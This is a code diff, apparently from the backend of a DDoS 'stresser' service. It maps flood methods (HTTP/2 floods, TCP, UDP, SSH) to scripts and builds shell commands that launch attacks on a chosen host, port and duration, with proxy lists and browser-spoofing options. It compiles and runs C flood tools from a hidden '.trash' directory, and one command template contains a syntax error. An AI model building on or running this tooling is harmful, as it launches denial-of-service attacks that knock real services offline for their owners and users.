@@ -19,8 +19,8 @@ const methods = {
     H2MERIS: 'H2-MERIS.js',
     H2FLOOD: 'H2-FLOOD.js',
     TCPSSH: 'tcpssh.js',
-    TCP: 'tcp.c',
-    UDP: 'udp.c'
+    TCP1: 'tcp.c',
+    UDP1: 'udp.c'
 };
 
 const activeProcesses = new Map();
@@ -57,9 +57,9 @@ const generateCommand = (method, host, port, time) => {
             return `cd /root/methods && node H2-MERIS.js GET ${host} ${time} 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`;
         case 'TCPSSH':
             return `cd /root/methods && screen -dm node tcpssh.js ${host} ${port} root ${time}`;
-        case 'UDP':
+        case 'UDP1':
             return `cd /root/.trash && gcc udp.c -o udp && ./udp ${host} ${port} ${time}`;
-        case 'TCP':
+        case 'TCP1':
             return `cd /root/.trash && gcc tcp.c -o tcp && ./tcp ${host} ${port) 3 662436 ${time}`;
         default:
             return `cd /root/methods && node ${methods[method]} ${host} ${time}`;
